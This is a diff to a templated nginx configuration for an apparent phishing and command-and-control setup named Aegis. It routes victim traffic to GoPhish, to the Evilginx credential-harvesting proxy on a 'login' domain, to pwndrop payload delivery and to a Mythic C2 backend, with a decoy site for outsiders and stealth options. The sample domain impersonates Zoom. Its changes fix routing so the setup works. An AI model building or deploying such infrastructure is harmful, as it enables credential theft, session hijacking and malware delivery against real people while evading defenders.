@@ -1,11 +1,12 @@
 # Aegis Centralized Smart Redirector
 # Entry point for all infrastructure traffic
 
-# Operator gating (allowlisted operator source IPs/CIDRs)
-# - Operators: forwarded to management/services
-# - Everyone else: sent to the decoy site on the redirector
+# Operator gating for ops.<base_domain> only (mail/cdn/api unchanged; login.* is TCP passthrough on 443).
+# - If operator_allowlist is non-empty: default non-operator (0); listed CIDRs are operators (1).
+# - If operator_allowlist is empty: default operator (1) so management UIs work without manual IPs.
+#   (Otherwise default 0 would send everyone to the decoy on ops.* and nothing would be reachable.)
 geo $is_operator {
-    default 0;
+    default {% if operator_allowlist | default([]) | length > 0 %}0{% else %}1{% endif %};
 {% for cidr in operator_allowlist | default([]) %}
     {{ cidr }} 1;
 {% endfor %}
@@ -28,18 +29,22 @@ upstream evilginx_backend {
     server {{ groups['evilginx'][0] }}:443;
 }
 
+# upstream pwndrop default http_port is 80 (see pwndrop.ini); mismatch with nginx causes 502.
 upstream pwndrop_backend {
-    server {{ groups['pwndrop'][0] }}:8080;
+    server {{ groups['pwndrop'][0] }}:{{ pwndrop_http_port | default(80) }};
 }
 
 upstream decoy_backend {
     server 127.0.0.1:8080;
 }
 
+# TLS for apex, api, mail, cdn, ops is on redirector_internal_ssl_port (default 8443).
+# Public 443 is handled by stream (see stream.d/aegis-evilginx.conf): SNI routes login.* to Evilginx passthrough.
+
 # 1. Main Decoy / Base Domain (e.g., zoom-meeting.duckdns.org)
 server {
     listen 80;
-    listen 443 ssl;
+    listen {{ redirector_internal_ssl_port | default(8443) }} ssl;
     server_name {{ base_domain }};
 
     ssl_certificate {{ redirector_ssl_cert_path }};
@@ -60,7 +65,7 @@ server {
 
 # 2. C2 Redirector (api.*)
 server {
-    listen 443 ssl;
+    listen {{ redirector_internal_ssl_port | default(8443) }} ssl;
     server_name {{ c2_domain }};
 
     ssl_certificate {{ redirector_ssl_cert_path }};
@@ -88,7 +93,7 @@ server {
 
 # 3. Phishing Entry (mail.*)
 server {
-    listen 443 ssl;
+    listen {{ redirector_internal_ssl_port | default(8443) }} ssl;
     server_name {{ mail_domain }};
 
     ssl_certificate {{ redirector_ssl_cert_path }};
@@ -101,35 +106,20 @@ server {
     location / {
         # Public phishing site entry (victim traffic)
         proxy_pass http://gophish_public_backend;
+        proxy_http_version 1.1;
         proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
         add_header X-Aegis-Filter "Phish-Entry";
     }
 }
 
-# 4. Login Landing (login.*)
-server {
-    listen 443 ssl;
-    server_name {{ login_domain }};
-
-    ssl_certificate {{ redirector_ssl_cert_path }};
-    ssl_certificate_key {{ redirector_ssl_key_path }};
-
-{% if stealth_level | default('high') != 'low' %}
-    include /etc/nginx/snippets/aegis-disable-metrics.conf;
-{% endif %}
-
-    location / {
-        # Operational domain (victim traffic)
-        proxy_pass https://evilginx_backend;
-        proxy_set_header Host $host;
-        proxy_ssl_verify off; # Evilginx uses its own certs
-        add_header X-Aegis-Filter "Login-Landing";
-    }
-}
+# 4. login.* HTTPS is TCP-passthrough to Evilginx:443 (stream + ssl_preread), not this http{} block.
 
 # 5. Payload Delivery (cdn.*)
 server {
-    listen 443 ssl;
+    listen {{ redirector_internal_ssl_port | default(8443) }} ssl;
     server_name {{ cdn_domain }};
 
     ssl_certificate {{ redirector_ssl_cert_path }};
@@ -142,7 +132,11 @@ server {
     location / {
         # Operational domain (payload delivery)
         proxy_pass http://pwndrop_backend;
+        proxy_http_version 1.1;
         proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
         add_header X-Aegis-Filter "Payload-Delivery";
     }
 }
@@ -150,7 +144,7 @@ server {
 # 6. Operator Management Portal (ops.*)
 # Operator-only entry point for management UIs.
 server {
-    listen 443 ssl;
+    listen {{ redirector_internal_ssl_port | default(8443) }} ssl;
     server_name ops.{{ base_domain }};
 
     ssl_certificate {{ redirector_ssl_cert_path }};
@@ -160,13 +154,12 @@ server {
     include /etc/nginx/snippets/aegis-disable-metrics.conf;
 {% endif %}
 
-    # Non-operators see decoy
-    if ($is_operator = 0) {
-        proxy_pass http://decoy_backend;
-        break;
-    }
-
+    # Non-operators see decoy (proxy_pass is only valid inside location, not in server-level if)
     location /mythic/ {
+        if ($is_operator = 0) {
+            proxy_pass http://decoy_backend;
+            break;
+        }
         rewrite ^/mythic/?(.*)$ /$1 break;
         proxy_pass https://mythic_backend;
         proxy_ssl_verify off;
@@ -176,28 +169,85 @@ server {
     }
 
     location /gophish/ {
+        if ($is_operator = 0) {
+            proxy_pass http://decoy_backend;
+            break;
+        }
         rewrite ^/gophish/?(.*)$ /$1 break;
         proxy_pass http://gophish_admin_backend;
+        proxy_http_version 1.1;
         proxy_set_header Host $host;
         proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
         add_header X-Aegis-Filter "Ops-GoPhish";
     }
 
+    # Evilginx routes phishlets by Host; ops.* must not be sent as SNI/Host or upstream returns errors (502).
     location /evilginx/ {
+        if ($is_operator = 0) {
+            proxy_pass http://decoy_backend;
+            break;
+        }
         rewrite ^/evilginx/?(.*)$ /$1 break;
         proxy_pass https://evilginx_backend;
-        proxy_set_header Host $host;
+        proxy_http_version 1.1;
+        proxy_set_header Host {{ login_domain }};
         proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_ssl_server_name on;
+        proxy_ssl_name {{ login_domain }};
         proxy_ssl_verify off;
+        proxy_connect_timeout 60s;
+        proxy_read_timeout 300s;
         add_header X-Aegis-Filter "Ops-Evilginx";
     }
 
     location /pwndrop/ {
+        if ($is_operator = 0) {
+            proxy_pass http://decoy_backend;
+            break;
+        }
         rewrite ^/pwndrop/?(.*)$ /$1 break;
         proxy_pass http://pwndrop_backend;
+        proxy_http_version 1.1;
         proxy_set_header Host $host;
         proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_connect_timeout 60s;
+        proxy_read_timeout 300s;
         add_header X-Aegis-Filter "Ops-Pwndrop";
+    }
+
+    # Mythic redirects (301) to /new/login, /graphql, /v1/, etc. without the /mythic/ prefix — those URIs
+    # must hit mythic_backend or they would match location / and get the decoy.
+    location ~ ^/(new|graphql|v1alpha1|v2|v1|console|docs|jupyter|ws|sockjs-node|api|login)(/|$) {
+        if ($is_operator = 0) {
+            proxy_pass http://decoy_backend;
+            break;
+        }
+        proxy_pass https://mythic_backend;
+        proxy_ssl_verify off;
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        add_header X-Aegis-Filter "Ops-Mythic";
+    }
+
+    location ~ hot-update\.js$ {
+        if ($is_operator = 0) {
+            proxy_pass http://decoy_backend;
+            break;
+        }
+        proxy_pass https://mythic_backend;
+        proxy_ssl_verify off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        add_header X-Aegis-Filter "Ops-Mythic";
     }
 
     location / {
